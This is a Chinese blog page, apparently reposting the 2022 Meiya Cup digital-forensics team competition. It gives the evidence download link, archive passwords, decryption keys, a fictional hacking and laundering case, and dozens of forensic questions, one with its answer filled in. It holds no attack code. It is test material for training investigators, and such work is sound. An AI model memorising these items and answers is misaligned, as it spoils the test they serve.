@@ -1,0 +1,390 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>22美亚杯团队赛 | 琉璃幻彩的博客</title><meta name="author" content="琉璃幻彩"><meta name="copyright" content="琉璃幻彩"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基本信息 检材文件下载链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1kg8FMeMaj6BIBmuvUZHA3Q?pwd&#x3D;ngzs 提取码：ngzs 个人赛与团队赛下载文件解压密码：MeiyaCup2022 个人赛解压缩时间：45min左右 团队赛解压缩时间：1h20min左右  解密密钥个人赛加密容器解密密钥： 1CZDGm#&amp;2_Ns$7wSMn%ZGr7xntcHS7d5u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="22美亚杯团队赛">
+<meta property="og:url" content="https://fightergodnemo.github.io/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/2022%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B/index.html">
+<meta property="og:site_name" content="琉璃幻彩的博客">
+<meta property="og:description" content="基本信息 检材文件下载链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1kg8FMeMaj6BIBmuvUZHA3Q?pwd&#x3D;ngzs 提取码：ngzs 个人赛与团队赛下载文件解压密码：MeiyaCup2022 个人赛解压缩时间：45min左右 团队赛解压缩时间：1h20min左右  解密密钥个人赛加密容器解密密钥： 1CZDGm#&amp;2_Ns$7wSMn%ZGr7xntcHS7d5u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fightergodnemo.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2026-03-15T05:28:22.000Z">
+<meta property="article:modified_time" content="2026-04-13T10:39:00.000Z">
+<meta property="article:author" content="琉璃幻彩">
+<meta property="article:tag" content="取证WriteUp">
+<meta property="article:tag" content="团队赛">
+<meta property="article:tag" content="电子取证">
+<meta property="article:tag" content="美亚杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fightergodnemo.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "22美亚杯团队赛",
+  "url": "https://fightergodnemo.github.io/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/2022%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B/",
+  "image": "https://fightergodnemo.github.io/img/avatar.jpg",
+  "datePublished": "2026-03-15T05:28:22.000Z",
+  "dateModified": "2026-04-13T10:39:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "琉璃幻彩",
+      "url": "https://FighterGodNemo.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://fightergodnemo.github.io/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/2022%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B/index.html"><link rel="preconnect" href="https://cdn.staticfile.org"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.5.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.20260413234739673.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.staticfile.org/egjs-infinitegrid/4.13.0/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '22美亚杯团队赛',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><script src="/js/bg-firstpaint.js?v=20260402-2"></script><link rel="stylesheet" href="/css/custom.css?v=20260402-2"><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="琉璃幻彩的博客" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">112</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">130</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" data-has-custom-post-top-img="0"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">琉璃幻彩的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">22美亚杯团队赛</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">22美亚杯团队赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-15T05:28:22.000Z" title="发表于 2026-03-15 13:28:22">2026-03-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-13T10:39:00.000Z" title="更新于 2026-04-13 18:39:00">2026-04-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Forensic-%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">Forensic_电子取证</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Forensic-%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/">取证write-up</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Forensic-%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/">美亚杯</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>28分钟</span></span></div></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
+<li>检材文件下载链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1kg8FMeMaj6BIBmuvUZHA3Q?pwd=ngzs">https://pan.baidu.com/s/1kg8FMeMaj6BIBmuvUZHA3Q?pwd=ngzs</a></li>
+<li>提取码：ngzs</li>
+<li>个人赛与团队赛下载文件解压密码：MeiyaCup2022</li>
+<li>个人赛解压缩时间：45min左右</li>
+<li>团队赛解压缩时间：1h20min左右</li>
+</ul>
+<h2 id="解密密钥"><a href="#解密密钥" class="headerlink" title="解密密钥"></a>解密密钥</h2><p>个人赛加密容器解密密钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CZDGm#&amp;2_Ns$7wSMn%ZGr7xntcHS7d5uFta#Up9544jx_cvP$uFM7?pTDajN&amp;QyFDLS8U%hx$fXN^BY$Xsj+3@F^y#4QFXbUq@wLmkCE7?&amp;Yp+nX6s@hKrzpVE%v?&amp;</span><br></pre></td></tr></table></figure>
+
+<p>团队赛加密容器解密密钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">av?5CAXw;&amp;NX)6)%B&gt;Y&lt;Gx[IVq&lt;5F;mAQp]b@ftYpF6v,88~%wFCS&#125;.w*7”S(,I[gJE((9cwT@zEh2mY$AK[aZzW&amp;JFR&lt;\FE&#125;RC\Gjx[!ec^GrDne]xK)SuUPMWX</span><br></pre></td></tr></table></figure>
+
+<h2 id="案件详情"><a href="#案件详情" class="headerlink" title="案件详情"></a>案件详情</h2><p>2022年10月，警方收到AGC集团举报表示该公司网络的电邮系统有可疑连接及流量。 经过调查后，警方相信事件与本地一个IP地址有关，于是拘捕了一名男子朗尼 （Rooney），并在他家中检取了一些电脑，网络装置，手机作调查。</p>
+<p>2022年10月下旬，两名巡警在街上截查一名男子王景浩（阿浩 KingHo）时， 在他的背包中找到一些从网上下载的制作油漆弹教学材料，阿浩曾作出反抗但最后被制服。经调查后，警员发现阿浩计划於某日向某人投掷油漆弹，警员随后将他拘捕并于他家中检取了一批电脑，手机作调查。深入调查后发现阿浩亦与AGC集团网络被入侵事件有关。</p>
+<p>警方的电子数据取证小组在现场作出初步了调查并对涉案装置进行了电子数据取证。请你根据警方的资料，协助将事件经过还原。</p>
+<h2 id="警方资料"><a href="#警方资料" class="headerlink" title="警方资料"></a>警方资料</h2><h3 id="A-与’朗尼’相关的资料"><a href="#A-与’朗尼’相关的资料" class="headerlink" title="A)与’朗尼’相关的资料"></a>A)与’朗尼’相关的资料</h3><ol>
+<li>编号 1 朗尼的调查报告<br>文件路径：Meiya_cup_2022&#x2F;Group&#x2F;Report&#x2F;Rooney&#x2F;陳朗尼调查报告.pdf<br>哈希值：SHA256 FCE56F69C3042BC83B840EE41ED0F81EDAABB71EFA96F24F9BE0D74538791A0A</li>
+<li>编号 2 朗尼的手机的电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;Rooney&#x2F;Rooney_Mobile<br>哈希值：SHA256 E23446D9E5E3E3CCA9EAA4A96BAD00C691E5BA9A1EA73B7386029AF2D01C06AE</li>
+<li>编号 3 朗尼计算器的电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;Rooney&#x2F;Rooney_Desktop<br>哈希值：SHA256 C42516B67C481887C1D9D4232C586E1A9CA59C3307A51619E8AEDEC21622BBBF</li>
+<li>编号 4 朗尼草莓计算器电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;Rooney&#x2F;Rooney_Router<br>哈希值：SHA256 7B71AE36A91C627952EE1E0D286DF2131C65BC64AB0E79603BB3E74C28765CBD</li>
+</ol>
+<h3 id="B-与’AGC’集团相关的资料"><a href="#B-与’AGC’集团相关的资料" class="headerlink" title="B)与’AGC’集团相关的资料"></a>B)与’AGC’集团相关的资料</h3><ol>
+<li>编号 5 AGC集团的调查报告<br>文件路径：Meiya_cup_2022&#x2F;Group&#x2F;Report&#x2F;AGC&#x2F;助查人士AGC集团调查报告.pdf<br>哈希值：SHA256 26A1BD9678363BB8A3AAFCD414872860CBECB7F9C71622485B7FD99E8EE86C24</li>
+<li>编号 6 AGC集团员工计算机的电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;AGC&#x2F;AGC_Desktop&#x2F;<br>哈希值：SHA256 2E025568EEB157E9139EBF63384B0FC8684A05E581C7B42D205DFA0399C740F1</li>
+<li>编号 7 AGC集团服务器的电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;AGC&#x2F;AGC_Server&#x2F;<br>哈希值：SHA256 C97400F74B69EC1CD9F4ABE6958E83BFF944284B5971BE820B56C8D574A011C1</li>
+<li>编号 8 AGC集团媒体服务器的电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;AGC&#x2F;AGC_MediaServer&#x2F;<br>哈希值：MD5 1364b9f0e8f4c1fbb63f23463acb6883</li>
+<li>编号 9 AGC集团的PCAP档案<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;AGC&#x2F;AGC_pcap&#x2F;<br>哈希值：SHA256 8321E090D24A6735904BEC5489B34FB75A4B5564725F2B70CA5587F37DBDD1C4</li>
+<li>编号 10 警员调查报告<br>文件路径：Meiya_cup_2022&#x2F;Group&#x2F;Report&#x2F;AGC&#x2F;警员调查报告.pdf<br>哈希值：SHA256 2C4D9658E63964E1A97A11052FB3B846921ACE30EE0B53D7E7B55D229A8DF316</li>
+</ol>
+<h3 id="C-与’王景浩’相关的资料"><a href="#C-与’王景浩’相关的资料" class="headerlink" title="C)与’王景浩’相关的资料"></a>C)与’王景浩’相关的资料</h3><ol>
+<li>编号 11 王景浩的调查报告<br>文件路径：Meiya_cup_2022&#x2F;Group&#x2F;Report&#x2F;KingHo&#x2F;王景浩调查报告.pdf<br>哈希值：SHA256 D64FADC80DF7D0E1F54F85395B78F63FAB9F98ADAECCCAE3E976DB2D532A3616</li>
+<li>编号 12 王景浩USB记忆棒的电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;KingHo&#x2F;KingHo_USB<br>哈希值：SHA256 3B808480FBC29EF7464E42BAC44C7A7166E90F718F265AF95D84E598389A2377</li>
+<li>编号 13 王景浩SD咭的电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;KingHo&#x2F;KingHo_Memory_Card<br>哈希值：SHA256 3FD99E55335B0631069745CBD9BD595B00BEAF2DEA16B0605265C738FB17B6DE</li>
+<li>编号 14 王景浩计算机的电子数据<br>文件路径：&#x2F;Meiya_cup_2022&#x2F;Group&#x2F;Image&#x2F;KingHo_Macbook<br>哈希值：SHA256 FB7CB5E71F8AFC691CF767403549FF6C425094352021136827716C8CB8DBD124</li>
+</ol>
+<h2 id="题目（按题型）"><a href="#题目（按题型）" class="headerlink" title="题目（按题型）"></a>题目（按题型）</h2><h3 id="填空题"><a href="#填空题" class="headerlink" title="填空题"></a>填空题</h3><ol>
+<li>在朗尼手机于2022年9月30日的 ‘WhatsApp’ 对话里，有一段音讯 (Voice Message) 提到王景浩会给朗尼现金多少作为租用 ‘VPN’ 的租金? (以阿拉伯数字回答) (3分)</li>
+<li>就AGC集团网络的流媒体服务器 (Media Server)，有多少个本地用户曾经成功登录过? (以阿拉伯数字回答) (1分)</li>
+<li>就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用 ‘ssh’ (Secure Shell)登录过? (以阿拉伯数字回答) (2分)</li>
+<li>就上述的本地用户，成功通过 ‘ssh’ 登录过该流媒体服务器多少次? (以阿拉伯数字回答) (3分)</li>
+<li>就该流媒体服务器的本地用户, 有一个用户名是 ‘S’ 开头的, 该用户的姓氏是什么? (以大写英文回答) (3分)</li>
+<li>承上题，拥有该段儿童色情影片的用户名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答) (1分)</li>
+<li>就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 <a target="_blank" rel="noopener" href="https://web3.com/">https://web3.com</a> (<a target="_blank" rel="noopener" href="https://web3.com/)%EF%BC%8C%E9%9C%80%E5%9B%9E%E7%AD%94">https://web3.com/)，需回答</a> HTTPSWEB3COM) (2分)</li>
+<li>该基本镜像存储池 (pool) 有一个快照 (Snapshot)，快照的名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 media&#x2F;mediapool@abc123，需回答MEDIAMEDIAPOOLABC123) (1分)</li>
+<li>就上述所找到的基本镜像存储池快照 (Snapshot)，它储存了多少个档案? (以阿拉伯数字回答) (1分)</li>
+<li>在上述行动后，IP地址61.238.217.108利用哪个端口 (Port) 向AGC服务器10.0.66.184发出指令? (以阿拉伯数字回答) (1分)</li>
+<li>分析计算机里的电邮数据，当中包含嫌疑人王景浩可能的居住地址，请回答他住址的楼层 (以阿拉伯数字回答) (1分)</li>
+<li>承上题，王景浩使用的信用卡号码最后四位数字是? (1分)</li>
+<li>AGC-CS计算机用户 ‘Carson’ 曾经收到一个电邮并通过里面的链结下载了一个可疑的 ‘Word’ 文件，那个档案的档案名是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (1分)</li>
+<li>黑客第一次采用用户 ‘admin’ 通过远程桌面协议 (Remote Desktop Protocol - RDP) 登录了AGC-CS计算机的时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (2分)</li>
+<li>黑客入侵AGC-CS计算机后下载了一个扫描端口 (Port Scanning) 的软件，这软件的真正名称是? (以大写英文及阿拉伯数字回答) (3分)</li>
+<li>承上题，黑客采用上述软件取得一些计算机的IP地址及媒体访问控制地址 (‘Media Access Control’ Address - MAC Address) 并存到一个名为 ‘ip.txt’ 的档案。 当中 ‘192.168.182.130’ 计算机的MAC地址是什么? (不要输入 ‘：’ 或 ‘-’ ，以大写英文及阿拉伯数字回答) (3分)</li>
+<li>AGC-CS计算机里的一个跳转列表 (Jumplist) 显示了用户 ‘admin’ 曾经采用记事本 (Notepad) 打开了一个文字档案，这个文字档的SHA-256哈希值是什么? (以大写英文及阿拉伯数字回答) (3分)</li>
+<li>AGC_Server里LVM (Logical Volume Management 逻辑卷轴管理) 的 VG (Volume Group 卷组) ‘pve’ 共有多少PE (Physical Extent 物理块) ? (以阿拉伯数字回答) (1分)</li>
+<li>AGC_Server里LVM 的 LV(邏輯卷)“pve-data” 使用了多少百分比的空間? (不用填寫 ‘%’，以阿拉伯数字回答) (3分)</li>
+<li>分析 ‘VM’ (虚拟机) 编号 ‘111’ AGC网站的网页服务器日志，当中记录了黑客曾向该服务器发出多少次與远程代码執行 (Remote Code Execution) 的网络攻击？ (以阿拉伯数字回答) (2分)</li>
+<li>黑客在入侵 ‘VM’ 编号 ‘111’ 后，打算涂改AGC公司的网页，黑客在传送相关档案时所用的端口 (Port) 是什么? (以阿拉伯数字回答) (3分)</li>
+<li>黑客曾入侵 ‘VM’ 编号 ‘111’ 里的电邮系统 ‘Xeams’，他登录的时间是? (以unix时间戳回答，格式如:1665049779010) (2分)</li>
+<li>承上题，分析程序代码 (Program Code)，上述程序的档案名应该是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (3分)</li>
+<li>王景浩的计算机当前有多少个用户 (包括访客 ‘Guest’ )? (以阿拉伯数字回答) (1分)</li>
+<li>王景浩的计算机里有一个用户被删除，被删除的用户名称是什么? (以大写英文回答) (1分)</li>
+<li>王景浩的计算机有多少个 ‘聚焦’ 的搜索记録 (Spotlight Search) ? (以阿拉伯数字回答) (1分)</li>
+<li>王景浩曾经将一台 iPhone 6 连接他的计算机，请问它最后的连接时间是什么? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (2分)</li>
+<li>王景浩采用了4位数字加密了他的iPhone XR的备份，分析它的密码是什么? (以阿拉伯数字回答) (3分)</li>
+<li>最后一次连上王景浩计算机的3D打印机的IP 地址是什么? (不要输入答案中的 ‘.’，以阿拉伯数字回答) (2分)</li>
+<li>3D打印机最后一次在王景浩的计算机尝试打印的时间? (以时区UTC+8回答) (2分)</li>
+<li>王景浩曾经冒充AGC公司员工 ‘Carson’ 发送电邮给AGC 客户，这封电邮的 ‘Message-ID’ 是什么? 回答它的首８位数值。(以大写英文和阿拉伯数字回答，如 4GEF90GD) (2分)<br>   E44F4376</li>
+<li>王景浩的计算机于2022年9月29日曾经接上一个虚拟专用网络 (Virtual Private Network - VPN)，这个VPN的IP地址是什么? (不要输入答案中的 ‘.’，以阿拉伯数字回答) (2分)</li>
+<li>装置 ‘「KingHoo」的iPhone’ 的蓝牙媒体访问控制地址 (MAC Address) 是什么? (不要输入答案中的 ‘：’ 或 ‘-’ ，以大写英文及阿拉伯数字回答) (1分)</li>
+<li>承上题，那张照片修改后的经纬度是什么? (不要输入答案中的 ‘.’，将经纬度合并回答。 如 22.2846135 114.1739116，需回答 2228461351141739116) (3分)</li>
+<li>朗尼草莓计算机操作系统设定了一个档案来储存系统的 ‘log_file’ ，档案名称是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (2分)</li>
+<li>根据装置的过往记录，‘log_file’ 是设在 ‘usr&#x2F;rooney&#x2F;’ 的哪个已被删除的子文件夹里 (Sub Directory)? (以大写英文回答) (3分)</li>
+<li>王景浩 SD 记忆卡 (SD Memory Card) 的储存容量有多少个字节 (Byte) ? (以阿拉伯数字回答) (1分)</li>
+<li>承上题，通过分析及手动恢复还原，记忆卡里有多少个出錯的情况出现? (以阿拉伯数字回答) (3分)</li>
+<li>恢复还原后的记忆卡中，第二个文件系统显示有多少个空闲簇 (Free Cluster)? (以阿拉伯数字回答) (2分)</li>
+<li>记忆卡第一个文件系统中有一个视频档，它的SHA-256哈希值是 ‘847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19’，这个视频的档数据存在文件系统 (File System) 的最后的簇号 (Last Cluster Number) 是什么? (以阿拉伯数字回答) (2分)</li>
+<li>朗尼通过比特币替王景浩清洗黑钱，分析朗尼的计算机及手机，朗尼收取王景浩黑钱的比特币地址 (Bitcoin Address) 是什么? (以大写英文及阿拉伯数字回答) (1分)</li>
+<li>在朗尼的计算机旁找到 ‘MetaMask’ 的密码是 ‘opensea741’，找出朗尼计算机里的 ‘MetaMask’ 中有多少加密货币余额? (不要输入 ‘.’，以阿拉伯数字回答，如 0.137 需回答 0137) (2分)</li>
+<li>朗尼的计算机曾用什么电邮地址登录电邮帐号? (不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 <a href="mailto:&#x6e;&#97;&#x6d;&#x65;&#64;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">name@mail.com</a> (mailto:<a href="mailto:&#x6e;&#x61;&#109;&#101;&#64;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">name@mail.com</a>)，需回答 NAMEMAILCOM) (1分)</li>
+<li>什么电邮账号曾接收过上述电邮地址发送的电邮？（不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 <a href="mailto:&#x6e;&#97;&#x6d;&#101;&#64;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;">name@mail.com</a> (mailto:<a href="mailto:&#110;&#97;&#109;&#101;&#64;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">name@mail.com</a>)，需回答 NAMEMAILCOM） (1分)</li>
+<li>上述电邮附件里的文件，被遮蔽的英文单字是什么? (以大写英文回答) (3分)</li>
+<li>根据上述电邮附件里找到的回复种子 (Recovery Seed)，计算朗尼在 ‘MetaMask’ 使用的以太币 (Ethereum) 地址。 (提示： BIP-44 derivation path &#x3D; m&#x2F;44’&#x2F;60’&#x2F;0’&#x2F;0&#x2F;0) (以大写英文及阿拉伯数字回答) (3分)</li>
+<li>朗尼手机的 ‘WhatsApp’ 号码是什么? ( 号 码 ) @s.whatsapp.net? (以阿拉伯数字回答) (1分)</li>
+</ol>
+<h3 id="单选题"><a href="#单选题" class="headerlink" title="单选题"></a>单选题</h3><ol>
+<li>试找找记录失败的登录尝试信息. 有以下哪一个名称曾尝试用 ‘ssh:notty’ 登录该流媒体服务器? (2分)<br>A. iamhacker<br>B. hacking<br>C. hack<br>D. hacker<br>E. 以上皆非</li>
+<li>就上述的Docker镜像，哪一个镜像在系统上运行中? (2分)<br>A. apache2<br>B. ubuntu<br>C. centos<br>D. nginx<br>E. hello-world<br>F. 以上皆非</li>
+<li>该流媒体服务器里其中一个本地用户是有使用 ‘calendar’ 日历工具的, 日历内曾经提及以下哪个网站? (3分)<br>A. <a target="_blank" rel="noopener" href="https://weibo.com/">https://weibo.com</a> (<a target="_blank" rel="noopener" href="https://weibo.com/">https://weibo.com/</a>)<br>B. <a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a> (<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com/</a>)<br>C. <a target="_blank" rel="noopener" href="https://www.douyin.com/">https://www.douyin.com</a> (<a target="_blank" rel="noopener" href="https://www.douyin.com/">https://www.douyin.com/</a>)<br>D. <a target="_blank" rel="noopener" href="https://youku.com/">https://youku.com</a> (<a target="_blank" rel="noopener" href="https://youku.com/">https://youku.com/</a>)<br>E. <a target="_blank" rel="noopener" href="https://www.binance.com/">https://www.binance.com</a> (<a target="_blank" rel="noopener" href="https://www.binance.com/">https://www.binance.com/</a>)<br>F. 以上皆非</li>
+<li>该流媒体服务器里是有使用磁盘阵列 (RAID) 的, 该设备是使用哪一个 RAID 级别? (请选择最合适的答案) (1分)<br>A. RAID 0<br>B. RAIDz2<br>C. RAIDz3<br>D. RAID 10<br>E. RAID 5<br>F. 以上皆非</li>
